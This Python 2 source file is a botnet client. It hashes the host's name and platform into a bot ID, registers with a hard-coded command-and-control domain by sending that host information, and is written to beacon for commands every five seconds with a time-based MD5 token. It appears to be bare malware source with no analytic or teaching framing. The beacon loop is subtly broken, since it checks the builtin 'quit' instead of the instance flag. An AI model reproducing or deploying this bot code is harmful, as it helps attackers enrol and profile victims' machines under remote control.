import httplib, urllib, socket, hashlib, time, platform

class Bot(object):
    def __init__(self):
        self.hostname = socket.gethostname()
        self.plat = platform.platform()
        self.seed = self.hostname + self.plat
        self.id = hashlib.md5(self.seed).hexdigest()
        self.c2 = 'cgboal.xyz'
        print self.register()
        self.quit = False
        while not quit:
            time.sleep(5)
            self.beacon()


    def register(self):
        t = int(time.time())
        regParams = {"botId": self.id, "botName": self.hostname, 'platform' : self.plat, 't' : t }
        return self.post(regParams, '/reg/').read()

    def beacon(self):
        t = int(time.time())
        bParams = {'botId' : self.id, 't' : t}
        return self.post(bParams, '/cmd/').read()



    def post(self, params, path):
        conn = httplib.HTTPConnection(self.c2)
        headers = {"Content-type": "application/x-www-form-urlencoded",
                   "Accept" : "text/plain"}
        params['auth'] = self.genTimeSeed()
        params = urllib.urlencode(params)
        conn.request('POST', path, params, headers)
        return conn.getresponse()

    def get(self, path):
        conn = httplib.HTTPConnection(self.c2)
        conn.request('GET', path)
        return conn.getresponse()


    def genTimeSeed(self):
        seed = self.roundDown(int(time.time()), 5)
        return hashlib.md5(str(seed)).hexdigest()

    def roundDown(self, num, factor):
        return num - (num%factor)


if __name__ == "__main__":
    bot = Bot()